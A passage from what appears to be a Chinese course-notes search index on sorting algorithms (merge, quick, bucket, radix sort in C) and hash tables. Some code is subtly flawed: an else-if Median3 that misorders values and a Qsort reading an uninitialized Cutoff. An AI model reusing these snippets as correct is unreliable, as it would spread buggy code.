TmpA[], int L, int RightEnd )\n{ /* \u6838\u5fc3\u9012\u5f52\u6392\u5e8f\u51fd\u6570 */ \n    int Center;\n\n    if ( L &lt; RightEnd ) {\n        Center = (L+RightEnd) / 2;\n        Msort( A, TmpA, L, Center );              /* \u9012\u5f52\u89e3\u51b3\u5de6\u8fb9 */ \n        Msort( A, TmpA, Center+1, RightEnd );     /* \u9012\u5f52\u89e3\u51b3\u53f3\u8fb9 */  \n        Merge( A, TmpA, L, Center+1, RightEnd );  /* \u5408\u5e76\u4e24\u6bb5\u6709\u5e8f\u5e8f\u5217 */ \n    }\n}\n\nvoid MergeSort( ElementType A[], int N )\n{ /* \u5f52\u5e76\u6392\u5e8f */\n    ElementType *TmpA;\n    TmpA = (ElementType *)malloc(N*sizeof(ElementType));\n\n    if ( TmpA != NULL ) {\n        Msort( A, TmpA, 0, N-1 );\n        free( TmpA );\n    }\n    else printf( \"\u7a7a\u95f4\u4e0d\u8db3\" );\n}\n</code></pre> </li> <li> <p>\u975e\u9012\u5f52\u7b97\u6cd5: </p> code <pre><code>/* \u8fd9\u91ccMerge\u51fd\u6570\u5728\u9012\u5f52\u7248\u672c\u4e2d\u7ed9\u51fa */\n\n/* length = \u5f53\u524d\u6709\u5e8f\u5b50\u5217\u7684\u957f\u5ea6*/\nvoid Merge_pass( ElementType A[], ElementType TmpA[], int N, int length )\n{ /* \u4e24\u4e24\u5f52\u5e76\u76f8\u90bb\u6709\u5e8f\u5b50\u5217 */\n    int i, j;\n\n    for ( i=0; i &lt;= N-2*length; i += 2*length )\n        Merge( A, TmpA, i, i+length, i+2*length-1 );\n    if ( i+length &lt; N ) /* \u5f52\u5e76\u6700\u540e2\u4e2a\u5b50\u5217*/\n        Merge( A, TmpA, i, i+length, N-1);\n    else /* \u6700\u540e\u53ea\u52691\u4e2a\u5b50\u5217*/\n        for ( j = i; j &lt; N; j++ ) TmpA[j] = A[j];\n}\n\nvoid Merge_Sort( ElementType A[], int N )\n{ \n    int length; \n    ElementType *TmpA;\n\n    length = 1; /* \u521d\u59cb\u5316\u5b50\u5e8f\u5217\u957f\u5ea6*/\n    TmpA = malloc( N * sizeof( ElementType ) );\n    if ( TmpA != NULL ) {\n        while( length &lt; N ) {\n            Merge_pass( A, TmpA, N, length );\n            length *= 2;\n            Merge_pass( TmpA, A, N, length );\n            length *= 2;\n        }\n        free( TmpA );\n    }\n    else printf( \"\u7a7a\u95f4\u4e0d\u8db3\" );\n}\n</code></pre> </li> </ul> <p>\u5f52\u5e76\u6392\u5e8f\u5728\u5916\u6392\u5e8f\u4e2d\u8f83\u4e3a\u6709\u7528</p>"}, {"location": "Course/FDS/Lec05/#_6", "title": "\u5feb\u901f\u6392\u5e8f", "text": "<pre><code>void Quicksort(ElementType A[], int N)\n{\n    if(N &lt; 2)\n        return;\n    pivot = \u4ece A[] \u4e2d\u9009\u4e00\u4e2a\u4e3b\u5143;\n    \u5c06 S = { A[] \\ pivot } \u5206\u6210\u4e24\u4e2a\u72ec\u7acb\u5b50\u96c6 A1 \u548c A2;\n\n    A[] = Quicksort(A1, N1) + {pivot} + Quicksort(A2, N2);\n}\n</code></pre> <p>\u5206\u800c\u6cbb\u4e4b:  \u5feb\u901f\u6392\u5e8f\u7684\u6700\u597d\u60c5\u51b5 \u2014\u2014 \u6bcf\u6b21\u6b63\u597d\u4e2d\u5206 \u2014\u2014 \\(T(N) = O(NlogN)\\) \u4e24\u4e2a\u4e3b\u8981\u6b65\u9aa4: \u9009\u4e3b\u5143\u3001\u5b50\u96c6\u5212\u5206</p> <ul> <li>\u4e00\u6b21\u5212\u5206\u8fc7\u7a0b: </li> </ul>      \u5047\u8bbe\u5bf9\u4ee5\u4e0b\u5341\u4e2a\u6570\u5b57\u5feb\u901f\u6392\u5e8f      6 1 2 7 9 3 4 5 10 8      \u5047\u5982\u9009\u53d6\u7b2c\u4e00\u4e2a\u6570\u5b57\u4e3a pivot, \u5373 pivot = 6, \u8981\u4f7f\u5f97 6 \u5de6\u8fb9\u7684\u6570\u5b57\u90fd &lt;= 6, \u5de6\u8fb9\u7684\u6570\u90fd &gt;= 6. \u90a3\u4e48\u5b9a\u4e49\u5de6\u8fb9\u4e00\u4e2a \"\u54e8\u5175\" i (i \u4ece 1 \u5f00\u59cb), \u53f3\u8fb9\u4e3a j      6 1 2 7 9 3 4 5 10 8 i j      \u9996\u5148\u4ece\u53f3\u5411\u5de6\u79fb\u52a8 j \u76f4\u5230\u627e\u5230\u5c0f\u4e8e 6 \u7684\u6570, \u518d\u4ece\u5de6\u5411\u53f3\u627e\u5230\u5927\u4e8e 6 \u7684\u6570      6 1 2 7 9 3 4 5 10 8 i j      \u4ea4\u6362\u4ed6\u4eec      6 1 2 5 9 3 4 7 10 8 i j      \u79fb\u52a8 \"\u54e8\u5175\" (\u63d0\u9192 : \u6bcf\u6b21\u5fc5\u987b j \u5148\u51fa\u53d1)      6 1 2 5 9 3 4 7 10 8 i j 6 1 2 5 9 3 4 7 10 8 i j      \u4ea4\u6362      6 1 2 5 4 3 9 7 10 8 i j      \u7ee7\u7eed\u79fb\u52a8, \u6b64\u65f6 j \u5411\u5de6\u79fb\u52a8\u53d1\u73b0 3 &lt; 6 \u505c\u4e0b. \u79fb\u52a8 i , \u6b64\u65f6 i \u4e0e j \u76f8\u9047 \u2014\u2014&gt; \u7b2c\u4e00\u6b21 \"\u63a2\u6d4b\" \u7ed3\u675f\uff0c\u5c06 pivot = 6 \u548c 3 \u4ea4\u6362      3 1 2 5 4 6 9 7 10 8 i j      \u968f\u540e\u4ee5 6 \u4e3a\u5206\u754c\u70b9\u62c6\u5206\u6210\u4e24\u4e2a\u5e8f\u5217 (\"3 1 2 5 4\" &amp; \"9 7 10 8\") \u518d\u4f9d\u6b21 \"\u63a2\u6d4b\" \u00b7\u00b7\u00b7"}, {"location": "Course/FDS/Lec05/#_7", "title": "\u9009\u4e3b\u5143", "text": "<ul> <li>\u9519\u8bef\u65b9\u6cd5: pivot = arr[0] (\u5bf9\u4e8e\u5df2\u7ecf\u6392\u5217\u597d\u987a\u5e8f\u7684\u7ec4\u5408\u4ecd\u4f1a\u6d88\u8017\u6389 \\(O(N^2)\\) \u7684\u65f6\u95f4)</li> <li>\u5b89\u5168\u65b9\u6cd5: pivot = random element in arr (\u989d\u5916\u5e26\u6765\u7684\u5f00\u9500: \u968f\u673a\u6570\u7684\u751f\u6210)</li> <li> <p>\u4e09\u6570\u4e2d\u503c\u5206\u5272 | Median-of-Partitioning: pivot = median(left + center + right)</p> Median3 <pre><code>ElementType Median3(ElementType A[], int Left, int Right)\n{\n    int Center = (Left + Right) / 2;\n    if(A[Left] &gt; A[Center])\n    {\n        Swap(&amp;A[Left], &amp;A[Center]);\n    }\n    else if(A[Left] &gt; A[Right])\n    {\n        Swap(&amp;A[Left], &amp;A[Right]);\n    }\n    else if(A[Right] &lt; A[Center])\n    {\n        Swap(&amp;A[Right], &amp;A[Center]);\n    }\n    /* A[Left] &lt;= A[Center] &lt;= A[Right] */\n    Swap(&amp;A[Center], &amp;A[Right-1]);  //\u5c06 pivot \u85cf\u5230\u53f3\u8fb9\n    /* \u53ea\u9700\u8981\u8003\u8651 A[Left+1] ... A[Right-2] */\n    return A[Right-1];  /* \u8fd4\u56de pivot */\n}\n</code></pre> </li> </ul>"}, {"location": "Course/FDS/Lec05/#_8", "title": "\u5b50\u96c6\u5212\u5206", "text": "<ul> <li>\u5f53\u6709\u5143\u7d20\u6b63\u597d\u7b49\u4e8e pivot \u65f6<ul> <li>\u505c\u4e0b\u6765\u4ea4\u6362 \u221a</li> <li>\u4e0d\u7406\u4ed6\uff0c\u7ee7\u7eed\u79fb\u52a8\u6307\u9488 \u00d7</li> </ul> </li> </ul> \u8865\u5145 <ul> <li>\u5c0f\u6570\u7ec4<ul> <li>\u5bf9\u4e8e N (N \\(\\le\\) 20), \u5feb\u901f\u6392\u5e8f\u6162\u4e8e\u63d2\u5165\u6392\u5e8f</li> <li>\u53ef\u4ee5\u5728\u9012\u5f52\u5230 N \u8f83\u5c0f\u7684\u60c5\u51b5\u4e0b\u5c06\u5feb\u901f\u6392\u5e8f\u66f4\u6539\u4e3a\u63d2\u5165\u6392\u5e8f</li> </ul> </li> <li>\u590d\u6742\u5ea6 \u2013 \\(T(N) = T(i) + T(N-i-1) + cN\\)<ul> <li>\\(T_{worst}(N) = T(N-1) + cN ~ \\rightarrow ~ T(N) = O(N^2)\\)</li> <li>\\(T_{best}(N) = 2T(N/2) + cN ~ \\rightarrow ~ T(N) = O(NlogN)\\)</li> <li>Average Case: <ul> <li>\u5047\u8bbe\u5bf9\u6bcf\u4e2a i, \\(T(i)\\) \u7684\u5e73\u5747\u503c\u662f \\(\\frac{1}{N}[\\sum\\limits_{j=0}^{N-1} T(j)]\\) </li> <li>\\(T(N) = \\frac{2}{N}[\\sum\\limits_{j=0}^{N-1} T(j)] + cN ~ \\rightarrow ~ T(N) = O(NlogN)\\)</li> </ul> </li> </ul> </li> </ul> \u5b8c\u6574\u7b97\u6cd5 <pre><code>/* \u5feb\u901f\u6392\u5e8f */\nElementType Median3( ElementType A[], int Left, int Right )\n{ \n    int Center = (Left+Right) / 2;\n    if ( A[Left] &gt; A[Center] )\n        Swap( &amp;A[Left], &amp;A[Center] );\n    if ( A[Left] &gt; A[Right] )\n        Swap( &amp;A[Left], &amp;A[Right] );\n    if ( A[Center] &gt; A[Right] )\n        Swap( &amp;A[Center], &amp;A[Right] );\n    /* \u6b64\u65f6A[Left] &lt;= A[Center] &lt;= A[Right] */\n    Swap( &amp;A[Center], &amp;A[Right-1] ); /* \u5c06\u57fa\u51c6Pivot\u85cf\u5230\u53f3\u8fb9*/\n    /* \u53ea\u9700\u8981\u8003\u8651A[Left+1] \u2026 A[Right-2] */\n    return  A[Right-1];  /* \u8fd4\u56de\u57fa\u51c6Pivot */\n}\n\nvoid Qsort( ElementType A[], int Left, int Right )\n{ /* \u6838\u5fc3\u9012\u5f52\u51fd\u6570 */ \n    int Pivot, Cutoff, Low, High;\n\n    if ( Cutoff &lt;= Right-Left ) { /* \u5982\u679c\u5e8f\u5217\u5143\u7d20\u5145\u5206\u591a\uff0c\u8fdb\u5165\u5feb\u6392 */\n        Pivot = Median3( A, Left, Right ); /* \u9009\u57fa\u51c6 */ \n        Low = Left; High = Right-1;\n        while (1) { /*\u5c06\u5e8f\u5217\u4e2d\u6bd4\u57fa\u51c6\u5c0f\u7684\u79fb\u5230\u57fa\u51c6\u5de6\u8fb9\uff0c\u5927\u7684\u79fb\u5230\u53f3\u8fb9*/\n            while ( A[++Low] &lt; Pivot ) ;\n            while ( A[--High] &gt; Pivot ) ;\n            if ( Low &lt; High ) Swap( &amp;A[Low], &amp;A[High] );\n            else break;\n        }\n        Swap( &amp;A[Low], &amp;A[Right-1] );   /* \u5c06\u57fa\u51c6\u6362\u5230\u6b63\u786e\u7684\u4f4d\u7f6e */ \n        Qsort( A, Left, Low-1 );    /* \u9012\u5f52\u89e3\u51b3\u5de6\u8fb9 */ \n        Qsort( A, Low+1, Right );   /* \u9012\u5f52\u89e3\u51b3\u53f3\u8fb9 */  \n    }\n    else InsertionSort( A+Left, Right-Left+1 ); /* \u5143\u7d20\u592a\u5c11\uff0c\u7528\u7b80\u5355\u6392\u5e8f */ \n}\n\nvoid QuickSort( ElementType A[], int N )\n{ /* \u7edf\u4e00\u63a5\u53e3 */\n    Qsort( A, 0, N-1 );\n}\n</code></pre>"}, {"location": "Course/FDS/Lec05/#_9", "title": "\u57fa\u6570\u6392\u5e8f", "text": "<p>Abstract</p> <ul> <li>\u8fd9\u4e4b\u4e0a\u7684\u6392\u5e8f\u7b97\u6cd5\u90fd\u6709\u4e00\u4e2a\u5171\u540c\u70b9 : </li> <li>\u4ec5\u4ec5\u57fa\u4e8e\u6bd4\u8f83\u5927\u5c0f\u51b3\u5b9a\u6392\u5e8f\u4f4d\u7f6e\uff0c\u6240\u6709\u8fd9\u4e9b\u7b97\u6cd5\u65f6\u95f4\u590d\u6742\u5ea6\u90fd\u9700\u8981\u8fdb\u884c \\(\\Omega (NlogN)\\) \u6b21\u6bd4\u8f83</li> <li>\u53ea\u7528\u5230\u6bd4\u8f83\u7684\u4efb\u4f55\u6392\u5e8f\u7b97\u6cd5\u5728\u6700\u574f\u60c5\u51b5\u4e0b\u90fd\u9700\u8981 \\(\\lceil log(N!) \\rceil\\) \u6b21\u6bd4\u8f83\u5e76\u5e73\u5747\u9700\u8981 \\(log(N!)\\) \u6b21\u6bd4\u8f83</li> </ul>"}, {"location": "Course/FDS/Lec05/#_10", "title": "\u6876\u6392\u5e8f", "text": "<ul> <li>\u5982\u679c\u8f93\u5165\u6570\u636e\u90fd\u5c0f\u4e8e M\uff0c\u5219\u53ef\u4ee5\u7528\u4e00\u4e2a\u5927\u5c0f\u4e3a M \u7684\u6570\u7ec4\u6765\u8bb0\u5f55\u67d0\u4e2a\u503c\u51fa\u73b0\u4e86\u591a\u5c11\u6b21\uff0c\u8fd9\u4e2a\u6570\u7ec4\u79f0\u4e3a\u6876 (bucket)</li> <li>\u6876\u521d\u59cb\u5316\u4e3a 0\uff0c\u904d\u5386\u8f93\u5165\u6570\u636e\uff0c\u5c06\u6bcf\u4e2a\u6570\u636e\u5bf9\u5e94\u7684\u6876\u52a0 1</li> <li>\u6700\u540e\u904d\u5386\u6876\u4e2d\u7684\u6240\u6709\u5143\u7d20\uff0c\u5bf9\u4e8e bucket[x] = y\uff0c\u5c06 x \u8f93\u51fa y \u6b21</li> <li>\u65f6\u95f4\u590d\u6742\u5ea6 \\(O(N+M)\\) (\u5982\u679c N \\(\\ll\\) M, \u7528\u57fa\u6570\u6392\u5e8f)</li> </ul> Example <ul> <li>\u5047\u8bbe\u6709 N \u4e2a\u5b66\u751f, \u4ed6\u4eec\u7684\u6210\u7ee9\u662f 0 \u5230 100 \u4e4b\u95f4\u7684\u6574\u6570 (\u4e8e\u662f\u6709 M = 101 \u4e2a\u4e0d\u540c\u7684\u6210\u7ee9\u503c) \u3002\u5982\u4f55\u5728\u7ebf\u6027\u65f6\u95f4\u5c06\u5b66\u751f\u6309\u6210\u7ee9\u6392\u5e8f:  <pre><code>void BucketSort(ElementType A[], int N)\n{\n    count[] \u521d\u59cb\u5316;\n    while(\u8bfb\u5165\u4e00\u4e2a\u5b66\u751f\u6210\u7ee9)\n        \u5c06\u5176\u63d2\u5165 count[grade] \u94fe\u8868\n    for(i = 0; i &lt; M; i++)\n        if(count[i])\n            \u8f93\u51fa\u6574\u4e2a count[i] \u94fe\u8868\n}\n</code></pre></li> </ul>"}, {"location": "Course/FDS/Lec05/#_11", "title": "\u57fa\u6570\u6392\u5e8f", "text": "<ul> <li>\u4ece\u4f4e\u4f4d\uff08LSD\uff0cLeast Significant Digit\uff09\u5230\u9ad8\u4f4d\uff08MSD\uff09\uff0c\u5bf9\u6bcf\u4e00\u4f4d\u8fdb\u884c\u8fdb\u884c\u6392\u5e8f (\u6b21\u4f4d\u4f18\u5148)</li> <li>\u65f6\u95f4\u590d\u6742\u5ea6 \\(O(P(N+B))\\) , \u5176\u4e2d \\(P\\) \u4e3a\u8f6e\u6570, \\(N\\) \u4e3a\u5143\u7d20\u4e2a\u6570, \\(B\\) \u4e3a\u6876\u4e2a\u6570</li> </ul> Example <p> \u56fe\u7247\u6458\u81ea MOOC</p> <p>\u6b64\u95ee\u9898\u4e2d\uff0cP \u5373\u662f logB</p> code-LSD <pre><code>/* \u57fa\u6570\u6392\u5e8f - \u6b21\u4f4d\u4f18\u5148 */\n\n/* \u5047\u8bbe\u5143\u7d20\u6700\u591a\u6709MaxDigit\u4e2a\u5173\u952e\u5b57\uff0c\u57fa\u6570\u5168\u662f\u540c\u6837\u7684Radix */\n#define MaxDigit 4\n#define Radix 10\n\n/* \u6876\u5143\u7d20\u7ed3\u70b9 */\ntypedef struct Node *PtrToNode;\nstruct Node {\n    int key;\n    PtrToNode next;\n};\n\n/* \u6876\u5934\u7ed3\u70b9 */\nstruct HeadNode {\n    PtrToNode head, tail;\n};\ntypedef struct HeadNode Bucket[Radix];\n\nint GetDigit ( int X, int D )\n{ /* \u9ed8\u8ba4\u6b21\u4f4dD=1, \u4e3b\u4f4dD&lt;=MaxDigit */\n    int d, i;\n\n    for (i=1; i&lt;=D; i++) {\n        d = X % Radix;\n        X /= Radix;\n    }\n    return d;\n}\n\nvoid LSDRadixSort( ElementType A[], int N )\n{ /* \u57fa\u6570\u6392\u5e8f - \u6b21\u4f4d\u4f18\u5148 */\n    int D, Di, i;\n    Bucket B;\n    PtrToNode tmp, p, List = NULL; \n\n    for (i=0; i&lt;Radix; i++) /* \u521d\u59cb\u5316\u6bcf\u4e2a\u6876\u4e3a\u7a7a\u94fe\u8868 */\n        B[i].head = B[i].tail = NULL;\n    for (i=0; i&lt;N; i++) { /* \u5c06\u539f\u59cb\u5e8f\u5217\u9006\u5e8f\u5b58\u5165\u521d\u59cb\u94fe\u8868List */\n        tmp = (PtrToNode)malloc(sizeof(struct Node));\n        tmp-&gt;key = A[i];\n        tmp-&gt;next = List;\n        List = tmp;\n    }\n    /* \u4e0b\u9762\u5f00\u59cb\u6392\u5e8f */ \n    for (D=1; D&lt;=MaxDigit; D++) { /* \u5bf9\u6570\u636e\u7684\u6bcf\u4e00\u4f4d\u5faa\u73af\u5904\u7406 */\n        /* \u4e0b\u9762\u662f\u5206\u914d\u7684\u8fc7\u7a0b */\n        p = List;\n        while (p) {\n            Di = GetDigit(p-&gt;key, D); /* \u83b7\u5f97\u5f53\u524d\u5143\u7d20\u7684\u5f53\u524d\u4f4d\u6570\u5b57 */\n            /* \u4eceList\u4e2d\u6458\u9664 */\n            tmp = p; p = p-&gt;next;\n            /* \u63d2\u5165B[Di]\u53f7\u6876\u5c3e */\n            tmp-&gt;next = NULL;\n            if (B[Di].head == NULL)\n                B[Di].head = B[Di].tail = tmp;\n            else {\n                B[Di].tail-&gt;next = tmp;\n                B[Di].tail = tmp;\n            }\n        }\n        /* \u4e0b\u9762\u662f\u6536\u96c6\u7684\u8fc7\u7a0b */\n        List = NULL; \n        for (Di=Radix-1; Di&gt;=0; Di--) { /* \u5c06\u6bcf\u4e2a\u6876\u7684\u5143\u7d20\u987a\u5e8f\u6536\u96c6\u5165List */\n            if (B[Di].head) { /* \u5982\u679c\u6876\u4e0d\u4e3a\u7a7a */\n                /* \u6574\u6876\u63d2\u5165List\u8868\u5934 */\n                B[Di].tail-&gt;next = List;\n                List = B[Di].head;\n                B[Di].head = B[Di].tail = NULL; /* \u6e05\u7a7a\u6876 */\n            }\n        }\n    }\n    /* \u5c06List\u5012\u5165A[]\u5e76\u91ca\u653e\u7a7a\u95f4 */\n    for (i=0; i&lt;N; i++) {\n        tmp = List;\n        List = List-&gt;next;\n        A[i] = tmp-&gt;key;\n        free(tmp);\n    } \n}\n</code></pre> code-MSD <pre><code>/* \u57fa\u6570\u6392\u5e8f - \u4e3b\u4f4d\u4f18\u5148 */\n\n/* \u5047\u8bbe\u5143\u7d20\u6700\u591a\u6709MaxDigit\u4e2a\u5173\u952e\u5b57\uff0c\u57fa\u6570\u5168\u662f\u540c\u6837\u7684Radix */\n\n#define MaxDigit 4\n#define Radix 10\n\n/* \u6876\u5143\u7d20\u7ed3\u70b9 */\ntypedef struct Node *PtrToNode;\nstruct Node{\n    int key;\n    PtrToNode next;\n};\n\n/* \u6876\u5934\u7ed3\u70b9 */\nstruct HeadNode {\n    PtrToNode head, tail;\n};\ntypedef struct HeadNode Bucket[Radix];\n\nint GetDigit ( int X, int D )\n{ /* \u9ed8\u8ba4\u6b21\u4f4dD=1, \u4e3b\u4f4dD&lt;=MaxDigit */\n    int d, i;\n\n    for (i=1; i&lt;=D; i++) {\n        d = X%Radix;\n        X /= Radix;\n    }\n    return d;\n}\n\nvoid MSD( ElementType A[], int L, int R, int D )\n{ /* \u6838\u5fc3\u9012\u5f52\u51fd\u6570: \u5bf9A[L]...A[R]\u7684\u7b2cD\u4f4d\u6570\u8fdb\u884c\u6392\u5e8f */\n    int Di, i, j;\n    Bucket B;\n    PtrToNode tmp, p, List = NULL; \n    if (D==0) return; /* \u9012\u5f52\u7ec8\u6b62\u6761\u4ef6 */\n\n    for (i=0; i&lt;Radix; i++) /* \u521d\u59cb\u5316\u6bcf\u4e2a\u6876\u4e3a\u7a7a\u94fe\u8868 */\n        B[i].head = B[i].tail = NULL;\n    for (i=L; i&lt;=R; i++) { /* \u5c06\u539f\u59cb\u5e8f\u5217\u9006\u5e8f\u5b58\u5165\u521d\u59cb\u94fe\u8868List */\n        tmp = (PtrToNode)malloc(sizeof(struct Node));\n        tmp-&gt;key = A[i];\n        tmp-&gt;next = List;\n        List = tmp;\n    }\n    /* \u4e0b\u9762\u662f\u5206\u914d\u7684\u8fc7\u7a0b */\n    p = List;\n    while (p) {\n        Di = GetDigit(p-&gt;key, D); /* \u83b7\u5f97\u5f53\u524d\u5143\u7d20\u7684\u5f53\u524d\u4f4d\u6570\u5b57 */\n        /* \u4eceList\u4e2d\u6458\u9664 */\n        tmp = p; p = p-&gt;next;\n        /* \u63d2\u5165B[Di]\u53f7\u6876 */\n        if (B[Di].head == NULL) B[Di].tail = tmp;\n        tmp-&gt;next = B[Di].head;\n        B[Di].head = tmp;\n    }\n    /* \u4e0b\u9762\u662f\u6536\u96c6\u7684\u8fc7\u7a0b */\n    i = j = L; /* i, j\u8bb0\u5f55\u5f53\u524d\u8981\u5904\u7406\u7684A[]\u7684\u5de6\u53f3\u7aef\u4e0b\u6807 */\n    for (Di=0; Di&lt;Radix; Di++) { /* \u5bf9\u4e8e\u6bcf\u4e2a\u6876 */\n        if (B[Di].head) { /* \u5c06\u975e\u7a7a\u7684\u6876\u6574\u6876\u5012\u5165A[], \u9012\u5f52\u6392\u5e8f */\n            p = B[Di].head;\n            while (p) {\n                tmp = p;\n                p = p-&gt;next;\n                A[j++] = tmp-&gt;key;\n                free(tmp);\n            }\n            /* \u9012\u5f52\u5bf9\u8be5\u6876\u6570\u636e\u6392\u5e8f, \u4f4d\u6570\u51cf1 */\n            MSD(A, i, j-1, D-1);\n            i = j; /* \u4e3a\u4e0b\u4e00\u4e2a\u6876\u5bf9\u5e94\u7684A[]\u5de6\u7aef */\n        } \n    } \n}\n\nvoid MSDRadixSort( ElementType A[], int N )\n{ /* \u7edf\u4e00\u63a5\u53e3 */\n    MSD(A, 0, N-1, MaxDigit); \n}\n</code></pre> <p>\u5982\u679c\u6b21\u4f4d\u5173\u952e\u5b57\u5efa\u7684\u6876\u5f88\u5c11\uff0c\u800c\u4e3b\u4f4d\u5173\u952e\u5b57\u5efa\u7684\u6876\u5f88\u591a\u4f7f\u5143\u7d20\u5206\u6563\u5f00\uff0c\u8fd9\u65f6\u518d\u5728\u6876\u5185\u90e8\u6392\u5e8f\u53ef\u80fd\u5c31\u53ea\u6d89\u53ca\u51e0\u4e2a\u5143\u7d20\u7684\u6392\u5e8f\uff0c\u8fd9\u65f6 MSD \u53ef\u80fd\u5c31\u8981\u66f4\u5feb\u4e86</p>"}, {"location": "Course/FDS/Lec05/#_12", "title": "\u6392\u5e8f\u7b97\u6cd5\u7684\u6bd4\u8f83", "text": "\u6392\u5e8f\u7b97\u6cd5 \u5e73\u5747\u65f6\u95f4\u590d\u6742\u5ea6 \u6700\u574f\u65f6\u95f4\u590d\u6742\u5ea6 \u989d\u5916\u7a7a\u95f4\u590d\u6742\u5ea6 \u7a33\u5b9a\u6027 \u5192\u6ce1\u6392\u5e8f \\(O(N^2)\\) \\(O(N^2)\\) \\(O(1)\\) \u7a33\u5b9a \u76f4\u63a5\u63d2\u5165\u6392\u5e8f \\(O(N^2)\\) \\(O(N^2)\\) \\(O(1)\\) \u7a33\u5b9a \u5f52\u5e76\u6392\u5e8f \\(O(NlogN)\\) \\(O(NlogN)\\) \\(O(N)\\) \u7a33\u5b9a \u57fa\u6570\u6392\u5e8f \\(O(P(N+B))\\) \\(O(P(N+B))\\) \\(O(N+B)\\) \u7a33\u5b9a \u7b80\u5355\u9009\u62e9\u6392\u5e8f \\(O(N^2)\\) \\(O(N^2)\\) \\(O(1)\\) \u4e0d\u7a33\u5b9a \u5e0c\u5c14\u6392\u5e8f \\(O(N^d)\\) \\(O(N^2)\\) \\(O(1)\\) \u4e0d\u7a33\u5b9a \u5806\u6392\u5e8f \\(O(NlogN)\\) \\(O(NlogN)\\) \\(O(1)\\) \u4e0d\u7a33\u5b9a \u5feb\u901f\u6392\u5e8f \\(O(NlogN)\\) \\(O(N^2)\\) \\(O(logN)\\) \u4e0d\u7a33\u5b9a"}, {"location": "Course/FDS/Lec06/", "title": "\u54c8\u5e0c | Hash", "text": "<p> \u7ea6 1120 \u4e2a\u5b57  120 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 5 \u5206\u949f</p> <p>Abstract</p> <p>\u91cd\u70b9: \u8bbe\u8ba1\u54c8\u5e0c\u51fd\u6570 + \u5982\u4f55\u89e3\u51b3\u51b2\u7a81</p>"}, {"location": "Course/FDS/Lec06/#_1", "title": "\u54c8\u5e0c\u8868 | \u6563\u5217\u8868", "text": "<ul> <li>\u54c8\u5e0c\u8868\u628a\u5173\u952e\u5b57 (\u6216\u6807\u8bc6\u7b26 | identifier) \u503c\u6620\u5c04\u5230\u8868\u4e2d\u4e00\u4e2a\u4f4d\u7f6e<ul> <li>\u652f\u6301\u67e5\u8be2\u3001\u63d2\u5165\u3001\u5220\u9664\u7b49\u64cd\u4f5c</li> </ul> </li> <li> <p>\u5bf9\u4e8e\u6807\u8bc6\u7b26 \\(x\\) , \u5b9a\u4e49\u4e00\u4e2a\u54c8\u5e0c\u51fd\u6570 \\(f(x) = x\\) \u5728\u54c8\u5e0c\u8868 ht[] \u4e2d\u7684\u4f4d\u7f6e </p> <ul> <li>\u5982\u56fe, ht \u7684\u5927\u5c0f\u4e3a \\(b\\)\uff08\u5373 \\(f(x)\\) \u503c\u57df\u4e3a \\([0, b-1]\\)\uff09\uff0c\u6700\u591a\u6709 s \u4e2a\u69fd</li> <li>\\(T\\) = \\(x\\) \u53ef\u80fd\u7684\u4e0d\u540c\u503c\u7684\u4e2a\u6570</li> <li>\\(n\\) = ht \u4e2d\u4e0d\u540c\u6807\u8bc6\u7b26\u7684\u4e2a\u6570</li> <li>\u6807\u8bc6\u7b26\u5bc6\u5ea6 (identifier density) = \\(n/T\\)</li> <li>\u88c5\u8f7d\u5bc6\u5ea6 (loading density) = \\(\\lambda = n/(sb)\\)</li> </ul> </li> <li> <p>\u51b2\u7a81 (collision) \u2014\u2014&gt; \u5f53\u5c06\u4e24\u4e2a\u4e0d\u540c\u7684\u6807\u8bc6\u7b26\u6563\u5217\u5230\u540c\u4e00\u4e2a\u6876\u4e2d\u65f6 (i.e. \\(i_1 \\neq i_2\\) \u4f46 \\(f(i_1) = f(i_2)\\) )</p> </li> <li>\u6ea2\u51fa\uff08overflow\uff09: \u5f53\u5c06\u4e00\u4e2a\u65b0\u7684\u6807\u8bc6\u7b26\u6563\u5217\u5230\u4e00\u4e2a\u6ee1\u7684\u6876\u65f6</li> </ul> <p>\u5f53 s = 1 \u65f6\uff0c\u78b0\u649e\u548c\u6ea2\u51fa\u5c06\u540c\u65f6\u53d1\u751f \u6ca1\u6709\u6ea2\u51fa\u65f6\uff0c\\(T_{search} = T_{insert} = T_{delete} = O(1)\\)</p> Example <p></p>"}, {"location": "Course/FDS/Lec06/#_2", "title": "\u54c8\u5e0c\u51fd\u6570", "text": "<p>Properties of f()</p> <ul> <li>\u51fd\u6570\u5fc5\u987b\u6613\u4e8e\u8ba1\u7b97\u4e14\u5c3d\u91cf\u51cf\u5c11\u78b0\u649e\u7684\u53ef\u80fd\u6027</li> <li>\u51fd\u6570\u5e94\u8be5\u662f\u516c\u6b63\u7684 (unbiased)\uff0c\u5373\u5bf9\u4efb\u610f \\(x\\) \u548c \\(i\\) \u90fd\u6709  \\(Probability(f(x) = i) = 1/b\\) . \u8fd9\u79cd\u51fd\u6570\u79f0\u4e3a\u5747\u5300\u54c8\u5e0c\u51fd\u6570\uff08uniform hash function\uff09</li> </ul> <p>\u51e0\u79cd\u51fd\u6570\u6784\u9020\u65b9\u6cd5: </p> <ul> <li> <p>\u9664\u7559\u4f59\u6570\u6cd5 \u2014\u2014 \\(f(x) = x ~~ \\% ~~ TableSize;\\) <code>/* if x is an integer*/</code></p> <ul> <li>TableSize \u6700\u597d\u9009\u62e9\u4e00\u4e2a\u8d28\u6570 \u2014\u2014 good for random integer keys</li> </ul> Example \u5173\u952e\u5b57 \u5185\u90e8\u4ee3\u7801 key MOD 100 key1 511 11 key2 512 12 key3 411 11 </li> <li> <p>\u5e73\u65b9\u53d6\u4e2d\u6cd5 \u2014\u2014 \u5148\u8ba1\u7b97\u5173\u952e\u5b57\u503c\u7684\u5e73\u65b9\uff0c\u7136\u540e\u53d6\u5e73\u65b9\u503c\u7684\u4e2d\u95f4\u51e0\u4f4d\u4f5c\u4e3a\u6563\u5217\u5730\u5740</p> Example \u5173\u952e\u5b57 \u5185\u90e8\u4ee3\u7801 \u5185\u90e8\u4ee3\u7801\u5e73\u65b9 hash(key) key1 511 261121 11 key2 512 262144 21 key3 411 168921 89 </li> <li> <p>\u6298\u53e0\u6cd5 \u2014\u2014 \u5c06\u5173\u952e\u5b57\u5206\u4e3a\u4f4d\u6570\u76f8\u540c\u7684\u51e0\u90e8\u5206\uff0c\u7136\u540e\u53d6\u8fd9\u51e0\u90e8\u5206\u7684\u53e0\u52a0\u548c\uff08\u820d\u53bb\u8fdb\u4f4d\uff09\u4f5c\u4e3a\u6563\u5217\u5730\u5740 